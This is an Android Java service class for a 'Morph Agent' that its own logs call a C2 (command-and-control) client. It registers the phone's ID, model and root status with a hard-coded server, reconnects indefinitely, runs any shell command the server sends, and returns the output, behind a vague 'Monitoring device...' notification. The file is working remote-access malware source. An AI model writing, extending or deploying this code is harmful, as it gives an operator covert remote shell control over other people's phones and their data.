package com.mobilemorph.agent.services;

import android.app.Service;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.content.Intent;
import android.content.Context;
import android.content.ComponentName;
import android.content.SharedPreferences;
import android.os.IBinder;
import android.os.Build;
import android.provider.Settings;
import android.util.Log;
import android.os.Handler;
import android.os.Looper;

import androidx.annotation.Nullable;

import com.mobilemorph.agent.utils.*;

import org.json.JSONObject;
import org.json.JSONException;

import java.util.Iterator;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;

import io.socket.client.IO;
import io.socket.client.Socket;
import io.socket.emitter.Emitter;

public class CommandService extends Service {
    private static final String TAG = "CommandService";
    private static final int NOTIF_ID = 1;
    private static final String NOTIF_CHANNEL_ID = "morph_agent";

    private static final String SERVER_URL = "http://192.168.6.198:5000";
    private String deviceId;
    private Socket mSocket;

    // Reconnect/backoff helpers
    private final Handler handler = new Handler(Looper.getMainLooper());
    private long reconnectBackoff = 1000; // Start with 1 second
    private final long MAX_BACKOFF = 60_000; // Max backoff of 1 minute
    private final Runnable reconnectRunnable = new Runnable() {
        @Override
        public void run() {
            try {
                Log.i(TAG, "manual reconnect runnable fired");
                if (mSocket == null) {
                    setupWebSocket(SERVER_URL, deviceId);
                } else {
                    if (!mSocket.connected()) {
                        Log.i(TAG, "manual reconnect: calling mSocket.connect()");
                        mSocket.connect();
                    } else {
                        Log.i(TAG, "manual reconnect: socket already connected");
                    }
                }
            } catch (Exception e) {
                Log.e(TAG, "reconnectRunnable error", e);
            }
        }
    };

    @Override
    public void onCreate() {
        super.onCreate();
        deviceId = getDeviceId();
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        Log.d(TAG, "CommandService started");

        // 1) Ensure notification channel for foreground service exists and call startForeground quickly
        createNotificationChannelIfNeeded();
        Notification notification = buildPersistentNotification();
        startForeground(NOTIF_ID, notification);
        Log.i(TAG, "startForeground() called");

        // 2) Register once (in background)
        new Thread(this::registerWithServer).start();

        // 3) Start WebSocket conection on background thread to avoid any main-thread work
        new Thread(() -> setupWebSocket(SERVER_URL, deviceId)).start();

        return Service.START_STICKY;
    }

    private String getDeviceId() {
        return Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
    }

    private boolean checkRootAccess() {
        String[] paths = {
            "/system/bin/su", "/system/xbin/su", "/sbin/su",
            "/system/sd/xbin/su", "/system/bin/failsafe/su",
            "/data/local/xbin/su", "/data/local/bin/su", "/data/local/su"
        };
        for (String path : paths) {
            if (new java.io.File(path).exists()) return true;
        }
        try {
            Process process = Runtime.getRuntime().exec(new String[]{"/system/xbin/which", "su"});
            BufferedReader in = new BufferedReader(new InputStreamReader(process.getInputStream()));
            return (in.readLine() != null);
        } catch (Exception e) {
            return false;
        }
    }

    /**
     * Robust socket.io setup with reconnection tuning and manual backoff fallback.
     * Replaces the previous simpler setupWebSocket.
     */
    private void setupWebSocket(String serverUrl, String deviceId) {
        try {
            // If already connected, nothing to do
            if (mSocket != null && mSocket.connected()) {
                Log.d(TAG, "setupWebSocket: socket already connected");
                return;
            }

            // Clean up previous socket if present 
            if (mSocket != null) {
                try { mSocket.off(); } catch (Exception ignored) {}
                try { mSocket.disconnect(); } catch (Exception ignored) {}
                try { mSocket.close(); } catch (Exception ignored) {}
                mSocket = null;
            }

            // Configure socket options
            IO.Options opts = new IO.Options();
            opts.reconnection = true;
            opts.reconnectionAttempts = Integer.MAX_VALUE; // Keep trying indefinitely
            opts.reconnectionDelay = 1000; // Start with 1 second delay
            opts.reconnectionDelayMax = (int) MAX_BACKOFF;
            opts.timeout = 20000; // 20 seconds timeout for initial connection

            Log.i(TAG, "setupWebSocket: connecting to " + serverUrl);
            mSocket = IO.socket(serverUrl, opts);

            // EVENT_CONNECT
            mSocket.on(Socket.EVENT_CONNECT, new Emitter.Listener() {
                @Override
                public void call(Object... args) {
                    Log.i("WS", "Connected to C2 server");
                    // Reset backoff on successful connection
                    reconnectBackoff = 1000;
                    // Emit registration event
                    try {
                        JSONObject payload = new JSONObject();
                        payload.put("device_id", deviceId);
                        payload.put("manufacturer", Build.MANUFACTURER);
                        payload.put("model", Build.MODEL);
                        payload.put("rooted", checkRootAccess());
                        mSocket.emit("register", payload);
                        Log.d("WS", "Registration emitted");
                    } catch (JSONException e) {
                        Log.e(TAG, "Failed to build/emit registration event payload", e);
                    }
                }
            });

            // EVENT_DISCONNECT
            mSocket.on(Socket.EVENT_DISCONNECT, new Emitter.Listener() {
                @Override
                public void call(Object... args) {
                    Log.w("WS", "Disconnected from C2 server");
                    scheduleManualReconnect();
                }
            });

            // EVENT_CONNECT_ERROR
            mSocket.on(Socket.EVENT_CONNECT_ERROR, new Emitter.Listener() {
                @Override
                public void call(Object... args) {
                    Log.e("WS", "Connection error: " + (args != null && args.length > 0 ? args[0] : "unknown/no-arg"));
                    scheduleManualReconnect();
                }
            });

            // EVENT_CONNECT_TIMEOUT
            mSocket.on(Socket.EVENT_CONNECT_TIMEOUT, new Emitter.Listener() {
                @Override
                public void call(Object... args) {
                    Log.e("WS", "Connection timeout");
                    scheduleManualReconnect();
                }
            });

            // Custom command event
            mSocket.on("command", new Emitter.Listener() {
                @Override
                public void call(Object... args) {
                    try {
                        if (args != null && args.length > 0) {
                            JSONObject cmdData = (JSONObject) args[0];
                            String cmd = cmdData.getString("cmd");
                            Log.d("WS", "Received command: " + cmd);
                            String result = ShellExecutor.execute(cmd);
                            JSONObject respPayload = new JSONObject();
                            respPayload.put("device_id", deviceId);
                            respPayload.put("result", result);
                            mSocket.emit("command_result", respPayload);
                        } else {
                            Log.w("WS", "Received 'command' event with invalid args");
                        }
                    } catch (Exception e) {
                        Log.e("WS", "Command handling failed", e);
                    }
                }
            });

            // Connect async
            mSocket.connect();
            Log.i(TAG, "setupWebSocket: mSocket.connect() called");

        } catch (Exception e) {
            Log.e(TAG, "setupWebSocket() failed", e);
            scheduleManualReconnect();
        }
    }

    private void scheduleManualReconnect() {
        try {
            handler.removeCallbacks(reconnectRunnable);
            Log.i(TAG, "Scheduling manual reconnect in " + reconnectBackoff + " ms");
            handler.postDelayed(reconnectRunnable, reconnectBackoff);
            // Exponential backoff for next attempt
            reconnectBackoff = Math.min(reconnectBackoff * 2, MAX_BACKOFF);
        } catch (Exception e) {
            Log.e(TAG, "scheduleManualReconnect() error", e);
        }
    }

    private void registerWithServer() {
        try {
            SharedPreferences prefs = getSharedPreferences("agent_prefs", MODE_PRIVATE);
            if (prefs.getBoolean("registered", false)) return;

            JSONObject payload = new JSONObject();
            payload.put("device_id", deviceId);
            payload.put("manufacturer", Build.MANUFACTURER);
            payload.put("rooted", checkRootAccess());

            URL url = new URL(SERVER_URL + "/register");
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("POST");
            conn.setRequestProperty("Content-Type", "application/json");
            conn.setDoOutput(true);

            OutputStream os = conn.getOutputStream();
            os.write(payload.toString().getBytes());
            os.flush();
            os.close();

            int code = conn.getResponseCode();
            if (code == 200) {
                prefs.edit().putBoolean("registered", true).apply();
                Log.d(TAG, "Agent registered successfully.");
            } else {
                Log.e(TAG, "Registration failed: " + code);
            }
        } catch (Exception e) {
            Log.e(TAG, "registerWithServer() failed", e);
        }
    }

    private void sendResult(String message) {
        try {
            JSONObject result = new JSONObject();
            result.put("device_id", deviceId);
            result.put("result", message);
            if (mSocket != null) {
                mSocket.emit("command_result", result);
            }
        } catch (Exception e) {
            Log.e(TAG, "sendResult() failed", e);
        }
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        Log.d(TAG, "CommandService stopped.");
        // Remove scheduled reconnects
        try { handler.removeCallbacks(reconnectRunnable); } catch (Exception ignored) {}

        // Cleanly remove listeners and disconnect socket
        if (mSocket != null) {
            try {
                mSocket.off();
                mSocket.disconnect();
                try { mSocket.close(); } catch (Exception ignored) {}
            } catch (Exception e) {
                Log.e(TAG, "Error during socket cleanup", e);
            } finally {
                mSocket = null;
            }
        }
    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    private Notification buildPersistentNotification() {
        Notification.Builder builder;
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            builder = new Notification.Builder(this, NOTIF_CHANNEL_ID);
        } else {
            builder = new Notification.Builder(this);
        }
        builder.setContentTitle("Morph Agent Running")
               .setContentText("Monitoring device...")
               .setSmallIcon(android.R.drawable.stat_notify_sync)
               .setOngoing(true);
        return builder.build();
    }

    private void createNotificationChannelIfNeeded() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel chan = new NotificationChannel(NOTIF_CHANNEL_ID, "Morph Agent", NotificationManager.IMPORTANCE_LOW);
            NotificationManager nm = (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);
            if (nm != null) nm.createNotificationChannel(chan);
        }
    }

    public static void startServer(Context ctx, int port) {
        Log.d("CommandService", "Starting C2 server on port: " + port);
        Intent intent = new Intent(ctx, CommandService.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            ctx.startForegroundService(intent);
        } else {
            ctx.startService(intent);
        }
    }

    public static void stopServer(Context ctx) {
        Log.d("CommandService", "Stopping C2 server");
        Intent intent = new Intent(ctx, CommandService.class);
        ctx.stopService(intent);
    }
}
